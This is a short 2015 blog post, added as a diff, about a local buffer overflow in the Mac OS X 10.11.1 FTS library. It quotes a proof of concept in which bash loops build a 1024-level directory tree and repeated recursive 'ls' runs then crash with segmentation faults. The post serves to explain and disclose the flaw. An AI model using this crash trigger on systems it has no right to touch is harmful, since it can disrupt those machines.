@@ -1,0 +1,87 @@
+---
+layout: post
+title: Mac OS X 10.11.1 FTS Buffer Overflow
+name: Mac OS X 10.11.1 FTS Buffer Overflow
+date: 2015-10-24 11:55:00
+tags: mac 10.11.1 osx fts buffer overflow vulnerability find ls rm
+---
+
+<p>
+  I was browsing around and found this cool little hack someone (Maksymilian Arciemowicz) found. It's pretty cool. It's a buffer overflow in Mac OS X 10.11.1 FTS.
+</p>
+
+<p>
+  What your doing is making 1024 directories and cd'ing into them using a for loop in bash.
+  Then you're cd'ing back out 1024 directoires back to where you started.
+  Then you are ls'ing recursivly with -a to ignore hidden, -l single column and -R recursive. You won't see any output if you run the sample below, it's being sent to dev/null (incase you didn't know)
+</p>
+
+<p>
+  When you do this it will lead to a segment fault, this is when a program tries to read or write to an illegal portion of memory. You have just crashed the program from a buffer overflow.
+</p>
+
+<p>
+  There's no CVE at the time I'm writing this, I ran into this lastnight and took my time writing this :-D. Also the english grammer isn't the best, but you should understand it.
+</p>
+
+<p><b> Code: </b></p>
+<p>
+  {% highlight text %}
+
+  Affected software:
+  - Commands such as: ls, find, rm
+  - probably more
+
+  Apple file system suffer for a issue recognised in FTS library. The main problem occur when we create deep filesystem hierarchy. Unexpected behavior of many programs and invalid memory write seems really interesting.
+
+  PoC:
+  Create an direcotry and perform the following actions:
+
+
+  # for i in {1..1024}; do mkdir B && cd B; done
+  ...
+  cd: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+
+
+  If such error occur, don't panic script will continuing. When the script will finish, you need back to top of directory. E.g.
+
+
+  # for i in {1..1024}; do cd .. ; done
+
+
+  Then you can perform recursive 'ls' command. Let's run it ten times:
+
+
+  # for i in {1..10}; do ls -laR > /dev/null; done
+  ls: B: No such file or directory
+  ls: B: No such file or directory
+  ls: B: No such file or directory
+  ls: B: No such file or directory
+  ls: B: No such file or directory
+  ls: B: No such file or directory
+  ls: B: No such file or directory
+  ls: B: No such file or directory
+  Segmentation fault: 11
+  Segmentation fault: 11
+  Segmentation fault: 11
+  ls: B: No such file or directory
+  ls: B: No such file or directory
+  Segmentation fault: 11
+  ls: B: No such file or directory
+  ls: B: No such file or directory
+
+
+  crash randometly. Let's see valgrind and lldb
+{% endhighlight %}
+</p>
+
+<p>
+   Luckily this isn't a remote vulnerability, but buffer overflows aren't good either. Those shouldn't be taken lightly, this could be a serious vulnerability. This could lead to code execution leading to someone running as root. See their site for the LLDB (debug) of what happened in the background
+</p>
+
+<p></p>
+
+<p><b> Sources: </b></p>
+<p>
+  https://cxsecurity.com/issue/WLB-2015100149
+</p>
